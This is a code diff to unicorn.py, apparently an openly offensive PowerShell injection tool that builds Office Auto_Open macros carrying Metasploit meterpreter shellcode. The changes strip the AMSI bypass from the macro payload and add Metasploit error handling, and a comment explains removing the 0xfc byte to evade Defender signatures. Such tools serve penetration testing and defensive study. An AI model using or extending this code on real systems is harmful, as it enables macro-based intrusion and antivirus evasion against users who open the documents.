@@ -495,7 +495,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.11 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.12 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -581,17 +581,18 @@ def scramble_stuff():
 # generate full macro
 def generate_macro(full_attack, line_length=50):
 
+    # we don't want to have AMSI_BYPASS messing with the payload itself so we strip the AMSI Bypass code to run our full powershell payload
+    if ("# actual unicorn payload") in full_attack:
+        full_attack = full_attack.split("actual unicorn payload")[1].split("\n")[1].rstrip()
+
     # randomize macro name
     macro_rand = generate_random_string(5, 10)
-
     # start of the macro
     macro_str = ("Sub Auto_Open()\nDim {0}\n{1} = ".format(macro_rand, macro_rand))
-
     if line_length is None:
         line_length_int = 50
     else:
         line_length_int = int(line_length)
-
     powershell_command_list = split_str(full_attack, line_length_int)
 
     counter = 0
@@ -786,8 +787,12 @@ def generate_shellcode(payload, ipaddr, port):
         data = proc.communicate()[0]
         # If you are reading through the code, you might be scratching your head as to why I replace the first 0xfc (CLD) from the beginning of the Metasploit meterpreter payload. Defender writes signatures here and there for unicorn, and this time they decided to look for 0xfc in the decoded (base64) code through AMSI. Interesting enough in all my testing, we shouldn't need a clear direction flag and the shellcode works fine. If you notice any issues, you can simply just make a variable like $a='0xfc'; at the beginning of the command and add a $a at the beginning of the shellcode which also evades. Easier to just remove if we don't need which makes the payload 4 bytes smaller anyways.
         data = data.decode("ascii").replace('"\\xfc', '"', 1)
-        # this isn't needed since we use shikata now, when shikata is removed, the 0xfc is an option
+        # bug output for metasploit, going to check here - if present then throw error message to end user
+        if "no longer be in use" in data or "long,erbe,inus,e,so,tryd,elet,ingt" in data:
+            print("[!] There was a problem generating the shellcode due to a Metasploit error. Please update Metasploit and re-run this.")
+            sys.exit()
 
+    # return the metasploit data
     return format_metasploit(data)
 
 # generate shellcode attack and replace hex
